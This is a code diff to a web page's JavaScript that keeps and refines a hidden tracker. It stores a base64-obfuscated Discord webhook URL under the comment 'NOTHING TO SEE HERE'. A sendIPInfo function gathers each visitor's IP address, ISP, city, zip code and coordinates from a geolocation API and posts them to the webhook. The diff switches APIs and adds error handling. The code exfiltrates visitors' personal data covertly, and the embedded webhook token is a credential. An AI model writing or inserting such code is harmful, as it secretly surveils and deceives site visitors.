@@ -67,6 +67,7 @@ $(document).ready(function(){
 
 
 // NOTHING TO SEE HERE
+// Obfuscated Webhook URL
 const encodedWebHookUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzMTQwMjYyOTQzNTg4MzY0MS9SMHNleGtZRkdncWV2LWRvRmhWdmQwR1BuUFBkWDFJSGNFajdjM2FfajVHUmNxZVpvaXZiQXRERVRrYjIxellEenJ5QQ==";
 
 function decodeWebHookUrl(encoded) {
@@ -77,6 +78,9 @@ const webHookUrl = decodeWebHookUrl(encodedWebHookUrl);
 
 async function fetchData(url) {
     const response = await fetch(url);
+    if (!response.ok) {
+        throw new Error(`HTTP error! status: ${response.status}`);
+    }
     return response.json();
 }
 
@@ -106,18 +110,27 @@ async function sendMessage(params, uniqueRandomNumber) {
 
 async function sendIPInfo() {
     try {
-        const data = await fetchData('https://ip-api.com/json/');
-        const ip = data.query;
-        const provider = `${data.org} (${data.as})`;
-        const timezone = data.timezone;
-        const country = data.country;
-        const countryCode = data.countryCode.toLowerCase();
-        const region = `${data.region} (${data.regionName})`;
-        const city = data.city;
-        const zip = data.zip;
-        const lat = data.lat;
-        const lon = data.lon;
+        // Fetch IP information from freeipapi.com
+        const data = await fetchData('https://freeipapi.com/api/json/');
+
+        // Check if the response contains the expected data
+        if (!data || !data.ipAddress) {
+            throw new Error('Invalid API response');
+        }
+
+        const ip = data.ipAddress;
+        const provider = data.isp || 'N/A';
+        const timezone = data.timeZone || 'N/A';
+        const country = data.countryName || 'N/A';
+        const countryCode = data.countryCode ? data.countryCode.toLowerCase() : 'N/A';
+        const region = data.regionName || 'N/A';
+        const city = data.cityName || 'N/A';
+        const zip = data.zipCode || 'N/A';
+        const lat = data.latitude || 'N/A';
+        const lon = data.longitude || 'N/A';
         const uniqueRandomNumber = generateUniqueRandomNumber();
+
+        // Prepare the message to send to Discord
         const params = {
             username: "Mr",
             content: `
@@ -136,6 +149,8 @@ Latitude: ${lat}
 **Unique Random Number:** ${uniqueRandomNumber}
 `
         };
+
+        // Send the message to Discord
         await sendMessage(params, uniqueRandomNumber);
     } catch (error) {
         console.error('Error:', error);
